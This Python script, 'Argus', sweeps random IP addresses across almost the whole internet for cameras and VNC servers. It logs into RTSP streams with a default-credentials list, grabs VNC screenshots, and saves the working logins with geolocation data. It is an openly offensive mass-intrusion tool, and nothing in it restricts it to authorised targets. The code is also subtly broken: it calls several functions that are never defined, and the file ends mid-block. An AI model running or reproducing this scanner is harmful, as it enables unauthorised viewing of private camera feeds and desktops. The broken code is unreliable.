# Hey! This is where we import all the good stuff we need
import asyncio
import aiohttp
import json
import random
import socket
import cv2
import time
import logging
from datetime import datetime
from ipaddress import ip_network, ip_address
import vncdotool.api
import zoomeye
import sys
import os
import win32file
import subprocess
import asyncio.exceptions
import signal
from contextlib import asynccontextmanager
import psutil
import geoip2.database
from onvif import ONVIFCamera
import ssl
import functools
import uuid
from collections import defaultdict

# These are our file paths - super important to keep organized!
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(SCRIPT_DIR, "logs", "argus_scan.log")
DEFAULT_CREDS_FILE = os.path.join(SCRIPT_DIR, "default_credentials.json")
VULNERABILITY_DB_FILE = os.path.join(SCRIPT_DIR, "vulnerability_db.json")
OUTPUT_FILE = os.path.join(SCRIPT_DIR, "output", "vulnerable_devices.json")
DETAILED_LOG_FILE = os.path.join(SCRIPT_DIR, "output", "detailed_hits.json")

# How many things we can do at once - tweak these if things get sluggish
WORKER_COUNT = 10000
MAX_SOCKETS = 20000
BATCH_SIZE = 2000
MAX_QUEUE_SIZE = WORKER_COUNT * 4
MAX_CONNECTIONS_PER_HOST = 2
RETRY_BASE_DELAY = 0.5
MAX_RETRIES = 2
URL_TIMEOUT = 3
SOCKET_BUFFER_SIZE = 1024

KEEPALIVE_TIMEOUT = 15
DNS_CACHE_TIME = 600

win32file._setmaxstdio(2048)

# Here's where we make Windows play nice with lots of connections
def configure_windows_sockets():
    try:
        socket.setdefaulttimeout(5)
        win32file._setmaxstdio(2048)
        subprocess.run(['netsh', 'int', 'tcp', 'set', 'global', 'autotuninglevel=restricted'], capture_output=True, check=True)
        logging.info("[+] Socket configuration complete")
        return True
    except Exception as e:
        logging.error(f"[-] Socket configuration error: {e}")
        return False

# Keeps track of how our scan is doing - like a progress bar on steroids!
class ScanProgress:
    def __init__(self):
        self.total_ips = 0
        self.scanned_ips = 0
        self.start_time = time.time()
        self.last_update = 0
        self.success_count = 0
        self.error_count = 0
        self.last_log_time = time.time()
        self.processed_since_last_log = 0

    def update(self, scanned=None, success=False, error=False):
        if scanned:
            self.scanned_ips = len(scanned)
        if success:
            self.success_count += 1
        if error:
            self.error_count += 1

        current_time = time.time()
        if current_time - self.last_update >= 2:
            elapsed = current_time - self.start_time
            rate = self.scanned_ips / elapsed if elapsed > 0 else 0
            print(f"\rProgress: {self.scanned_ips} IPs scanned ({rate:.2f} IPs/sec) | Found: {self.success_count} | Errors: {self.error_count} | Active Workers: {len(active_workers)}", end="", flush=True)
            self.last_update = current_time

        if current_time - self.last_log_time >= 10:
            logger.info(f"Progress Update - Scanned: {self.scanned_ips} IPs | Success: {self.success_count} | Errors: {self.error_count} | Rate: {self.processed_since_last_log / 10:.2f} IPs/sec")
            self.last_log_time = current_time
            self.processed_since_last_log = 0
        else:
            self.processed_since_last_log += 1

progress = ScanProgress()

configure_windows_sockets()

# Manages our connection pool - helps prevent overwhelming target systems
class SocketPool:
    def __init__(self, max_sockets):
        self.max_sockets = max_sockets
        self.active_sockets = 0
        self.lock = asyncio.Lock()
        self.host_connections = {}
        self.last_cleanup = time.time()
        self.backoff_times = {}

    async def acquire(self, host=None):
        async with self.lock:
            if host in self.backoff_times:
                delay = await self.backoff_manager.get_delay(host)
                logger.debug(f"Applying backoff for {host}: delaying for {delay} seconds")
                await asyncio.sleep(delay)
            
            await self._cleanup()
    
            if host:
                host_conn = self.host_connections.get(host, 0)
                if host_conn >= MAX_CONNECTIONS_PER_HOST:
                    logger.debug(f"Host-specific limit reached for {host}")
                    return None
                self.host_connections[host] = host_conn + 1
    
            while self.active_sockets >= self.max_sockets:
                logger.debug("Global socket limit reached, waiting...")
                await asyncio.sleep(0.1)
    
            self.active_sockets += 1
            return self.active_sockets
    
    async def release(self, host=None):
        async with self.lock:
            if host and host in self.host_connections:
                self.host_connections[host] -= 1
                if self.host_connections[host] <= 0:
                    del self.host_connections[host]
            self.active_sockets = max(0, self.active_sockets - 1)

    async def _cleanup(self):
        current_time = time.time()
        if current_time - self.last_cleanup > 60:
            self.host_connections.clear()
            self.last_cleanup = current_time

socket_pool = SocketPool(MAX_SOCKETS)

LOG_FORMAT = "%(asctime)s - %(levelname)s - %(message)s"
LOG_DATE_FORMAT = "%Y-%m-%d %H:%M:%S"

os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)

with open(LOG_FILE, 'w') as f:
    f.write(f"=== Argus Scanner Log Started at {datetime.now().strftime(LOG_DATE_FORMAT)} ===\n")

logging.basicConfig(
    level=logging.INFO,
    format=LOG_FORMAT,
    datefmt=LOG_DATE_FORMAT,
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)

logger = logging.getLogger('argus')
logger.setLevel(logging.INFO)

scanner_handler = logging.FileHandler(LOG_FILE)
scanner_handler.setFormatter(logging.Formatter(LOG_FORMAT, LOG_DATE_FORMAT))
logger.addHandler(scanner_handler)

logger.info("Logging system initialized")
logger.info("Starting Argus Scanner...")

def load_json_file(filename, default=None):
    try:
        with open(filename, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        logging.error(f"[-] File not found: {filename}")
        return default if default is not None else {}
    except json.JSONDecodeError:
        logging.error(f"[-] Invalid JSON in file: {filename}")
        return default if default is not None else {}

DEFAULT_CREDS = load_json_file(DEFAULT_CREDS_FILE, {})
VULNERABILITY_DB = load_json_file(VULNERABILITY_DB_FILE, {})

if not DEFAULT_CREDS:
    logging.error(f"[-] No default credentials loaded from {DEFAULT_CREDS_FILE}")
    sys.exit(1)

if not VULNERABILITY_DB:
    logging.warning(f"[!] No vulnerability database loaded from {VULNERABILITY_DB_FILE}")

IP_RANGES = [
    "10.0.0.0/8",
    "172.16.0.0/12",
    "192.168.0.0/16",
    *[f"{i}.0.0.0/8" for i in range(1, 224) if i not in [10, 127, 172, 192]]
]

PORTS_AND_PROTOCOLS = {
    'rtsp': [554, 8554, 10554],
    'http': [80, 8080, 443, 8443],
    'vnc': [5900, 5901]
}

COMMON_ENDPOINTS = [
    "/video.mjpg",
    "/stream",
    "/live",
    "/onvif/device_service",
    "/axis-cgi/mjpg/video.cgi",
    "/cgi-bin/viewer/video.jpg",
    "/img/video.mjpeg",
    "/cgi-bin/video.jpg",
    "/webcam/stream",
    "/cameras/stream",
    "/mjpg/video.mjpg",
    "/video",
    "/livefeed",
    "/videostream",
    "/viewer/live",
    "/cam/feed"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
]

# Super helpful database of RTSP URLs for different camera brands
# Feel free to add more as you discover them!
RTSP_URL_DATABASE = {
    "Hikvision": {
        "default": "/Streaming/Channels/101",
        "models": {
            "DS-2CD2042WD-I": "/Streaming/Channels/101",
            "DS-2CD2142FWD-I": "/Streaming/Channels/101"
        }
    },
    "Dahua": {
        "default": "/cam/realmonitor?channel=1&subtype=0",
        "models": {
            "IPC-HFW4300S": "/cam/realmonitor?channel=1&subtype=0",
            "IPC-HDW4300C": "/cam/realmonitor?channel=1&subtype=0"
        }
    },
    "Axis": {
        "default": "/axis-cgi/mjpg/video.cgi?resolution=640x480",
        "models": {
            "M1065-LW": "/axis-cgi/mjpg/video.cgi?resolution=640x480",
            "P3225-LVE": "/axis-cgi/mjpg/video.cgi?resolution=1920x1080"
        }
    },
    "Sony": {
        "default": "/img/video.sav",
        "models": {
            "SNC-DH120": "/img/video.sav",
            "SNC-EM600": "/img/video.sav"
        }
    },
    "Panasonic": {
        "default": "/cgi-bin/camera",
        "models": {
            "WV-SP105": "/cgi-bin/camera",
            "WV-SW155": "/nphMotionJpeg?Resolution=640x480"
        }
    },
    "Samsung": {
        "default": "/onvif/profile/media.smp",
        "models": {
            "SNB-6004": "/onvif/profile/media.smp",
            "SNO-6084R": "/onvif/profile/media.smp"
        }
    },
    "Vivotek": {
        "default": "/live.sdp",
        "models": {
            "FD8169A": "/live.sdp",
            "IP8332": "/live.sdp"
        }
    },
    "Bosch": {
        "default": "/rtsp_tunnel",
        "models": {
            "NIN-733-V03P": "/rtsp_tunnel",
            "flexidome ip 3000i": "/rtsp_tunnel"
        }
    },
    "Pelco": {
        "default": "/pelcod/live",
        "models": {
            "IMS0-1E": "/pelcod/live",
            "sarix ime229 1": "/pelcod/live"
        }
    },
    "Honeywell": {
        "default": "/h264/video.cgi?channel=1",
        "models": {
            "HICC-P-1200T": "/h264/video.cgi?channel=1",
            "hicc p 1200t": "/h264/video.cgi?channel=1"
        }
    },
    "Arecont Vision": {
        "default": "/h264/video.cgi?channel=1",
        "models": {
            "AV2115": "/h264/video.cgi?channel=1",
            "av2115dnv1": "/h264/video.cgi?channel=1"
        }
    },
    "ACTi": {
        "default": "/live.sdp",
        "models": {
            "ACM-1231": "/live.sdp",
            "acm 1231": "/live.sdp"
        }
    },
    "Mobotix": {
        "default": "/control/faststream.jpg?stream=full",
        "models": {
            "M24M-Sec": "/control/faststream.jpg?stream=full",
            "m24m sec": "/control/faststream.jpg?stream=full"
        }
    },
    "Avigilon": {
        "default": "/media.smp",
        "models": {
            "1.0C-H3-B2": "/media.smp",
            "1.0c h3 b2": "/media.smp"
        }
    },
    "Grandstream": {
        "default": "/goform/stream?cmd=get&channel=0",
        "models": {
            "GXV3672_HD": "/goform/stream?cmd=get&channel=0",
            "gxv3672 hd": "/goform/stream?cmd=get&channel=0"
        }
    },
    "FLIR": {
        "default": "/axis-cgi/mjpg/video.cgi?resolution=640x480",
        "models": {
            "FC-334-HT": "/axis-cgi/mjpg/video.cgi?resolution=640x480",
            "fc 334 ht": "/axis-cgi/mjpg/video.cgi?resolution=640x480"
        }
    },
    "Uniview": {
        "default": "/live/ch00_0",
        "models": {
            "IPC2122SR3-PF36": "/live/ch00_0",
            "ipc2122sr3 pf36": "/live/ch00_0"
        }
    },
    "Wanscam": {
        "default": "/live/ch00_0",
        "models": {
            "HW0021": "/live/ch00_0",
            "hw0021": "/live/ch00_0"
        }
    },
    "Foscam": {
        "default": "/cgi-bin/CGIProxy.fcgi?cmd=snapPicture2&usr={username}&pwd={password}",
        "models": {
            "FI9821W": "/cgi-bin/CGIProxy.fcgi?cmd=snapPicture2&usr={username}&pwd={password}",
            "fi9821w": "/cgi-bin/CGIProxy.fcgi?cmd=snapPicture2&usr={username}&pwd={password}"
        }
    },
    "Amcrest": {
        "default": "/cam/realmonitor?channel=1&subtype=0&authbasic={authbasic}",
        "models": {
            "IP2M-841": "/cam/realmonitor?channel=1&subtype=0&authbasic={authbasic}",
            "ip2m 841": "/cam/realmonitor?channel=1&subtype=0&authbasic={authbasic}"
        }
    },
    "Lorex": {
        "default": "/cam/realmonitor?channel=1&subtype=0&authbasic={authbasic}",
        "models": {
            "LNB3143": "/cam/realmonitor?channel=1&subtype=0&authbasic={authbasic}",
            "lnb3143": "/cam/realmonitor?channel=1&subtype=0&authbasic={authbasic}"
        }
    },
    "Swann": {
        "default": "/stream/live/1",
        "models": {
            "NHD-815": "/stream/live/1",
            "nhd 815": "/stream/live/1"
        }
    },
    "Zmodo": {
        "default": "/cgi-bin/net_jpeg.cgi?ch={channel}",
        "models": {
            "ZH-IXB15": "/cgi-bin/net_jpeg.cgi?ch={channel}",
            "zh ixb15": "/cgi-bin/net_jpeg.cgi?ch={channel}"
        }
    },
    "D-Link": {
        "default": "/mjpeg.cgi",
        "models": {
            "DCS-930L": "/mjpeg.cgi",
            "dcs 930l": "/mjpeg.cgi"
        }
    },
    "Netgear Arlo": {
        "default": "/stream.m3u8",
        "models": {
            "VMC3040": "/stream.m3u8",
            "vmc3040": "/stream.m3u8"
        }
    },
    "Reolink": {
        "default": "/h264Preview_{channel:02d}_main",
        "models": {
            "RLC-410": "/h264Preview_{channel:02d}_main",
            "rlc 410": "/h264Preview_{channel:02d}_main"
        }
    },
    "Geovision": {
        "default": "/liveview.cgi",
        "models": {
            "GV-BX1500-3V": "/liveview.cgi",
            "gv bx1500 3v": "/liveview.cgi"
        }
    },
    "Speco Technologies": {
        "default": "/cgi-bin/mjpeg?resolution=full&quality=high&cam={channel}",
        "models": {
            "O2iP6": "/cgi-bin/mjpeg?resolution=full&quality=high&cam={channel}",
            "o2ip6": "/cgi-bin/mjpeg?resolution=full&quality=high&cam={channel}"
        }
    },
    "Alptop": {
        "default": "/videostream.cgi?loginuse={username}&loginpas={password}",
        "models": {
            "AP-SDM01": "/videostream.cgi?loginuse={username}&loginpas={password}",
            "ap sdm01": "/videostream.cgi?loginuse={username}&loginpas={password}"
        }
    },
    "Apexis": {
        "default": "/cgi-bin/operator/getjpeg.cgi",
        "models": {
            "APM-J011-WS": "/cgi-bin/operator/getjpeg.cgi",
            "apm j011 ws": "/cgi-bin/operator/getjpeg.cgi"
        }
    },
    "HooToo": {
        "default": "/cgi/get_stream.cgi?loginuse={username}&loginpas={password}",
        "models": {
            "HT-IP210F": "/cgi/get_stream.cgi?loginuse={username}&loginpas={password}",
            "ht ip210f": "/cgi/get_stream.cgi?loginuse={username}&loginpas={password}"
        }
    },
    "iBaby": {
        "default": "/video.mjpeg",
        "models": {
            "M6S": "/video.mjpeg",
            "m6s": "/video.mjpeg"
        }
    },
    "INSTAR": {
        "default": "/livestream/11",
        "models": {
            "IN-6012HD": "/livestream/11",
            "in 6012hd": "/livestream/11"
        }
    },
    "Keekoon": {
        "default": "/cgi-bin/video.cgi?Channel=1",
        "models": {
            "KK002": "/cgi-bin/video.cgi?Channel=1",
            "kk002": "/cgi-bin/video.cgi?Channel=1"
        }
    },
    "Messoa": {
        "default": "/live.sdp",
        "models": {
            "NCR870": "/live.sdp",
            "ncr870": "/live.sdp"
        }
    },
    "Night Owl": {
        "default": "/live/00_0",
        "models": {
            "WNVR201-8-4": "/live/00_0",
            "wnvr201 8 4": "/live/00_0"
        }
    },
    "Q-See": {
        "default": "/live/00_0",
        "models": {
            "QC804": "/live/00_0",
            "qc804": "/live/00_0"
        }
    },
    "SV3C": {
        "default": "/livestream/12",
        "models": {
            "SV-B01POE-1080P-A": "/livestream/12",
            "sv b01poe 1080p a": "/livestream/12"
        }
    },
    "Tenvis": {
        "default": "/cgi-bin/mjpeg?resolution=full&quality=high&cam={channel}",
        "models": {
            "TH661": "/cgi-bin/mjpeg?resolution=full&quality=high&cam={channel}",
            "th661": "/cgi-bin/mjpeg?resolution=full&quality=high&cam={channel}"
        }
    },
    "TP-Link": {
        "default": "/stream/live/1",
        "models": {
            "NC200": "/stream/live/1",
            "nc200": "/stream/live/1"
        }
    },
    "TRENDnet": {
        "default": "/cgi-bin/video.jpg",
        "models": {
            "TV-IP310PI": "/cgi-bin/video.jpg",
            "tv ip310pi": "/cgi-bin/video.jpg"
        }
    },
    "Vimtag": {
        "default": "/livestream/11",
        "models": {
            "VT-361": "/livestream/11",
            "vt 361": "/livestream/11"
        }
    },
    "Wansview": {
        "default": "/live/ch00_0",
        "models": {
            "NCM625GA": "/live/ch00_0",
            "ncm625ga": "/live/ch00_0"
        }
    },
    "YI Home": {
        "default": "/live/ch00_0",
        "models": {
            "27US": "/live/ch00_0",
            "27us": "/live/ch00_0"
        }
    },
    "Zavio": {
        "default": "/cgi-bin/operator/getjpeg.cgi",
        "models": {
            "F3105": "/cgi-bin/operator/getjpeg.cgi",
            "f3105": "/cgi-bin/operator/getjpeg.cgi"
        }
    }
}

def generate_ip():
    ip_range = random.choice(IP_RANGES)
    network = ip_network(ip_range)
    return str(ip_address(random.randint(int(network.network_address), int(network.broadcast_address))))

async def is_port_open_async(ip, port, timeout=1):
    try:
        _, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=0.3)
        writer.close()
        await writer.wait_closed()
        return True
    except:
        return False

def identify_manufacturer(response_text):
    for manufacturer in DEFAULT_CREDS.keys():
        if manufacturer.lower() in response_text.lower():
            return manufacturer
    return None

scan_queue = asyncio.Queue()
scanned_ips = set()
active_workers = set()

@asynccontextmanager
async def opencv_capture(url):
    if not url or not isinstance(url, str):
        raise ValueError("Invalid URL provided to VideoCapture")

    url = url.strip()

    try:
        cap = cv2.VideoCapture()
        cap.set(cv2.CAP_PROP_BUFFERSIZE, 3)

        success = cap.open(url)
        if not success:
            raise RuntimeError(f"Failed to open video capture for URL: {url}")

        if not cap.isOpened():
            raise RuntimeError("Stream failed to initialize")

        ret, frame = cap.read()
        if not ret or frame is None:
            raise RuntimeError("Could not read initial frame from stream")

        yield cap
    finally:
        if cap is not None:
            cap.release()

async def detect_camera_model(manufacturer, stream_url):
    try:
        if manufacturer in RTSP_URL_DATABASE:
            async with opencv_capture(stream_url) as cap:
                width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
                height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
                fps = int(cap.get(cv2.CAP_PROP_FPS))

                for model, specs in RTSP_URL_DATABASE[manufacturer]["models"].items():
                    if (width, height) == (1920, 1080):
                        return model
    except Exception as e:
        logging.debug(f"[-] Error detecting model: {e}")
    return None

async def test_http_device_async(ip, port, session):
    url = f"http://{ip}:{port}"
    headers = {"User-Agent": random.choice(USER_AGENTS)}

    try:
        async with session.get(url, headers=headers, timeout=0.3, ssl=False) as response:
            if response.status == 200:
                text = await response.text(errors='ignore')
                if any(keyword in text.lower() for keyword in ['camera', 'rtsp', 'streaming']):
                    manufacturer = identify_manufacturer(text)
                    device_info = {
                        "ip": ip,
                        "port": port,
                        "protocol": "http",
                        "manufacturer": manufacturer or "Unknown",
                        "url": url
                    }
                    return device_info
    except:
        pass
    return None

def get_rtsp_url(manufacturer, model, username, password, ip, port):
    if manufacturer not in RTSP_URL_DATABASE:
        return None

    url_template = RTSP_URL_DATABASE[manufacturer]["models"].get(model, RTSP_URL_DATABASE[manufacturer]["default"])
    rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}{url_template}"
    return rtsp_url

async def test_rtsp_device_async(ip, port):
    for manufacturer, cred_list in DEFAULT_CREDS.items():
        for credentials in cred_list:
            username, password = credentials.split("/")
            rtsp_url = get_rtsp_url(manufacturer, None, username, password, ip, port)

            if not rtsp_url:
                continue

            try:
                async with opencv_capture(rtsp_url) as cap:
                    logging.info(f"[+] Found RTSP stream: {rtsp_url}")

                    width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
                    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
                    fps = int(cap.get(cv2.CAP_PROP_FPS))

                    is_valid, rtsp_info = await validate_rtsp_url(rtsp_url)
                    if not is_valid:
                        return None

                    result = {
                        "ip": ip,
                        "port": port,
                        "protocol": 'rtsp',
                        "manufacturer": manufacturer,
                        "username": username,
                        "password": password,
                        "url": rtsp_url,
                        "rtsp_info": rtsp_info,
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    }

                    save_valid_camera(result)

                    return result

            except ValueError as ve:
                logging.debug(f"[-] Invalid URL format for {rtsp_url}: {ve}")
                continue
            except RuntimeError as re:
                logging.debug(f"[-] Stream error for {rtsp_url}: {re}")
                continue
            except Exception as e:
                logging.debug(f"[-] Failed to open RTSP stream: {rtsp_url}: {str(e)}")
                continue

    return None

async def test_vnc_device_async(ip, port):
    vnc_url = f"vnc://{ip}:{port}"
    try:
        logging.debug(f"[*] Testing VNC connection: {vnc_url}")
        with vncdotool.api.connect(f"{ip}:{port}") as client:
            logging.info(f"[+] Found VNC service: {vnc_url}")
            client.captureScreen("vnc_screenshot.png")
            logging.info(f"[+] VNC screenshot saved to vnc_screenshot.png")

            return {
                "ip": ip,
                "port": port,
                "protocol": 'vnc',
                "manufacturer": "Unknown",
                "username": "",
                "password": "",
                "url": vnc_url,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }

    except vncdotool.api.VNCDoException as e:
        logging.debug(f"[-] Failed to connect to VNC service: {vnc_url}: {e}")
    except Exception as e:
        logging.error(f"[-] Error testing VNC {ip}:{port}: {e}")
    return None

DNS_CACHE_TIME = 300
KEEPALIVE_TIMEOUT = 60
MAX_CONCURRENT_SCANS = 200
MEMORY_THRESHOLD = 85
BACKOFF_MIN_DELAY = 1
BACKOFF_MAX_DELAY = 60
GEOIP_DB_PATH = os.path.join(SCRIPT_DIR, "GeoLite2-City.mmdb")
VALID_CAMERAS_FILE = os.path.join(SCRIPT_DIR, "output", "valid_cameras.json")
URL_TIMEOUT = 10
MIN_CONTENT_LENGTH = 100

class ConnectionManager:
    def __init__(self):
        self.connector = aiohttp.TCPConnector(
            limit=MAX_SOCKETS,
            ttl_dns_cache=DNS_CACHE_TIME,
            use_dns_cache=True,
            keepalive_timeout=KEEPALIVE_TIMEOUT,
            force_close=False,
            enable_cleanup_closed=True
        )
        self.session = None
        self.semaphore = asyncio.Semaphore(MAX_CONCURRENT_SCANS)

    async def get_session(self):
        if not self.session:
            timeout = aiohttp.ClientTimeout(total=URL_TIMEOUT, connect=1)
            self.session = aiohttp.ClientSession(
                connector=self.connector,
                timeout=timeout,
                trust_env=True
            )
        return self.session

    async def close(self):
        if self.session:
            await self.session.close()

class BackoffManager:
    def __init__(self):
        self.failures = defaultdict(int)
        self.last_attempt = defaultdict(float)

    async def get_delay(self, ip):
        failures = self.failures[ip]
        if failures == 0:
            return 0
        return min(BACKOFF_MAX_DELAY, BACKOFF_MIN_DELAY * (2 ** failures))

    async def success(self, ip):
        self.failures[ip] = 0

    async def failure(self, ip):
        self.failures[ip] += 1
        self.last_attempt[ip] = time.time()

class CircuitBreaker:
    def __init__(self, failure_threshold=5, reset_timeout=60):
        self.failures = {}
        self.threshold = failure_threshold
        self.timeout = reset_timeout

    async def can_proceed(self, ip):
        if ip in self.failures:
            failures, last_failure = self.failures[ip]
            if failures >= self.threshold:
                if time.time() - last_failure < self.timeout:
                    return False
                del self.failures[ip]
        return True

    async def record_failure(self, ip):
        current_time = time.time()
        if ip not in self.failures:
            self.failures[ip] = [1, current_time]
        else:
            failures, _ = self.failures[ip]
            self.failures[ip] = [failures + 1, current_time]

def validate_credentials(creds_dict):
    valid_creds = {}
    for manufacturer, cred_list in creds_dict.items():
        if isinstance(cred_list, list):
            valid_creds[manufacturer] = []
            for cred in cred_list:
                if isinstance(cred, str) and "/" in cred:
                    valid_creds[manufacturer].append(cred)
                else:
                    logging.warning(f"[-] Invalid credential format for {manufacturer}: {cred}")
    return valid_creds

async def worker(worker_id, state):
    logger.info(f"Worker {worker_id} started")
    processed_count = 0
    session = await connection_manager.get_session()

    while state.running:
        try:
            batch = []
            try:
                for _ in range(BATCH_SIZE):
                    ip = state.scan_queue.get_nowait()
                    if ip not in state.scanned_ips:
                        batch.append(ip)
            except asyncio.QueueEmpty:
                if not batch:
                    await asyncio.sleep(0.1)
                    continue

            logger.debug(f"Worker {worker_id} processing batch of {len(batch)} IPs")

            tasks = []
            for ip in batch:
                tasks.append(scan_ip_async(ip))

            results = await asyncio.gather(*tasks, return_exceptions=True)

            processed_count += len(batch)
            if processed_count % 100 == 0:
                logger.info(f"Worker {worker_id} has processed {processed_count} IPs")

            for ip in batch:
                state.scanned_ips.add(ip)
                state.scan_queue.task_done()

            progress.update(state.scanned_ips)

        except Exception as e:
            logger.error(f"Worker {worker_id} error: {str(e)}")
            await asyncio.sleep(0.1)

    logger.info(f"Worker {worker_id} shutting down. Processed {processed_count} IPs")

class ScannerState:
    def __init__(self):
        self.running = True
        self.workers = set()
        self.scanned_ips = set()
        self.scan_queue = asyncio.Queue(maxsize=MAX_QUEUE_SIZE)
        self.active_workers = set()

    async def shutdown(self):
        self.running = False
        for worker in self.workers:
            if not worker.done():
                worker.cancel()
        if self.workers:
            await asyncio.gather(*self.workers, return_exceptions=True)

@asynccontextmanager
async def scanner_lifecycle(state):
    try:
        yield state
    finally:
        await state.shutdown()

async def log_detailed_hit(result):
    try:
        detailed_result = {
            "timestamp": datetime.now().isoformat(),
            "basic_info": result,
            "extended_info": {
                "network": {
                    "ip": result["ip"],
                    "port": result["port"],
                    "protocol": result["protocol"],
                    "response_time": result.get("fingerprint", {}).get("response_time"),
                    "open_ports": result.get("open_ports", [])
                },
                "device": {
                    "manufacturer": result["manufacturer"],
                    "model": result.get("model", "Unknown"),
                    "firmware": result.get("version"),
                    "os": result.get("os"),
                    "product": result.get("product")
                },
                "authentication": {
                    "username": result.get("username"),
                    "password": result.get("password"),
                    "default_creds_used": True
                },
                "services": {
                    "http": result.get("url"),
                    "rtsp": result.get("rtsp_url"),
                    "webserver": result.get("fingerprint", {}).get("headers", {}).get("Server"),
                    "onvif": result.get("onvif_info")
                },
                "security": {
                    "vulnerabilities": result.get("vulnerabilities", {}),
                    "headers": result.get("fingerprint", {}).get("headers", {})
                },
                "geolocation": result.get("geolocation", {}),
                "organization": {
                    "isp": result.get("isp"),
                    "org": result.get("org")
                },
                "banner": result.get("banner"),
                "scan_metadata": {
                    "scanner_version": "1.0",
                    "scan_id": str(uuid.uuid4()),
                    "scan_duration": time.time() - result.get("scan_start_time", time.time())
                }
            }
        }

        os.makedirs(os.path.dirname(DETAILED_LOG_FILE), exist_ok=True)
        with open(DETAILED_LOG_FILE, "a") as f:
            json.dump(detailed_result, f, indent=2)
            f.write("\n")

        logger.info(f"[+] Detailed hit logged for {result['ip']}:{result['port']}")

    except Exception as e:
        logger.error(f"[-] Error logging detailed hit: {e}")

# This is our main scanning function - where the magic happens!
async def scan_ip_async(ip):
    logger.debug(f"Starting scan of {ip}")

    # Let's not scan the same IP twice
    if ip in scanned_ips:
        logger.debug(f"IP {ip} already scanned, skipping")
        return

    if not await circuit_breaker.can_proceed(ip):
        logger.debug(f"Circuit breaker active for {ip}")
        return

    try:
        async with connection_manager.semaphore:
            logger.debug(f"Checking ports for {ip}")
            session = await connection_manager.get_session()
            tasks = []
            open_ports = []

            for protocol, ports in PORTS_AND_PROTOCOLS.items():
                for port in ports:
                    if await is_port_open_async(ip, port):
                        logger.info(f"Found open {protocol} port {port} on {ip}")
                        open_ports.append((protocol, port))

            if not open_ports:
                logger.debug(f"No open ports found for {ip}")
                return

            for protocol, port in open_ports:
                if protocol == 'http':
                    tasks.append(test_http_device_async(ip, port, session))
                elif protocol == 'rtsp':
                    tasks.append(test_rtsp_device_async(ip, port))
                elif protocol == 'vnc':
                    tasks.append(test_vnc_device_async(ip, port))

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for result in (r for r in results if isinstance(r, dict)):
                try:
                    result['scan_start_time'] = time.time()

                    enriched_result = await enrich_results(result)

                    onvif_info = await discover_onvif_devices(ip)
                    if onvif_info:
                        enriched_result['onvif_info'] = onvif_info

                    await log_detailed_hit(enriched_result)

                    save_to_json(enriched_result)

                    progress.update(scanned_ips, success=True)
                    logger.info(f"[+] Found and enriched device: {ip}:{result['port']}")

                except Exception as e:
                    logger.error(f"[-] Error processing result for {ip}: {str(e)}")

    except Exception as e:
        logger.error(f"Error scanning {ip}: {str(e)}")
        await circuit_breaker.record_failure(ip)
        progress.update(scanned_ips, error=True)

def save_to_json(data, filename=OUTPUT_FILE):
    try:
        with open(filename, "a") as f:
            json.dump(data, f)
            f.write("\n")
    except IOError as e:
        logging.error(f"[-] Failed to save results to {filename}: {e}")

# The brains of the operation - coordinates all our workers
async def main():
    banner = """
=== Argus - An (very) Ethical IP Camera Scanner ===
Version: 1.0
Author: Chun
    """
    print(banner)
    logger.info("Scanner initialization started")

    global connection_manager, circuit_breaker, backoff_manager
    connection_manager = ConnectionManager()
    circuit_breaker = CircuitBreaker()
    backoff_manager = BackoffManager()

    state = ScannerState()

    try:
        logger.info("Initializing scan queue...")
        initial_ips = [generate_ip() for _ in range(WORKER_COUNT * 2)]
        logger.info(f"Generated {len(initial_ips)} initial IPs")

        for ip in initial_ips:
            await state.scan_queue.put(ip)

        workers = []
        logger.info(f"Starting {WORKER_COUNT} workers...")
        for i in range(WORKER_COUNT):
            worker_task = asyncio.create_task(worker(i, state))
            workers.append(worker_task)
            state.workers.add(worker_task)
            await asyncio.sleep(0.01)

        logger.info(f"[*] Successfully started {WORKER_COUNT} workers")

        while True:
            await asyncio.sleep(5)
            active_count = len(state.active_workers)
            queue_size = state.scan_queue.qsize()
            scanned_count = len(state.scanned_ips)

            logger.info(
                f"Status Update - Active Workers: {active_count}/{WORKER_COUNT} | "
                f"Queue Size: {queue_size} | "
                f"Scanned IPs: {scanned_count} | "
                f"Success: {progress.success_count} | "
                f"Errors: {progress.error_count}"
            )

            if active_count < WORKER_COUNT:
                for i in range(WORKER_COUNT - active_count):
                    worker_id = len(workers) + i
                    worker_task = asyncio.create_task(worker(worker_id, state))
                    workers.append(worker_task)
                    state.workers.add(worker_task)
                    logger.info(f"[+] Started replacement worker {worker_id}")

            if queue_size < WORKER_COUNT:
                new_ips = [generate_ip() for _ in range(BATCH_SIZE)]
                for ip in new_ips:
                    if ip not in state.scanned_ips:
                        await state.scan_queue.put(ip)

    except KeyboardInterrupt:
        logger.warning("Received shutdown signal")
    except Exception as e:
        logger.error(f"Fatal error in main loop: {str(e)}", exc_info=True)
    finally:
        logger.info("Scanner shutdown complete")
        await state.shutdown()
        await connection_manager.close()

        print("\nScan Results:")
        print(f"Total IPs scanned: {len(state.scanned_ips)}")
        print(f"Devices found: {progress.success_count}")
        print(f"Errors: {progress.error_count}")

def handle_sigint(signum, frame):
    logger.warning("SIGINT received, initiating graceful shutdown...")
    raise KeyboardInterrupt

if __name__ == "__main__":
    try:
        signal.signal(signal.SIGINT, handle_sigint)
        logger.info("Starting main process")
        asyncio.run(main())
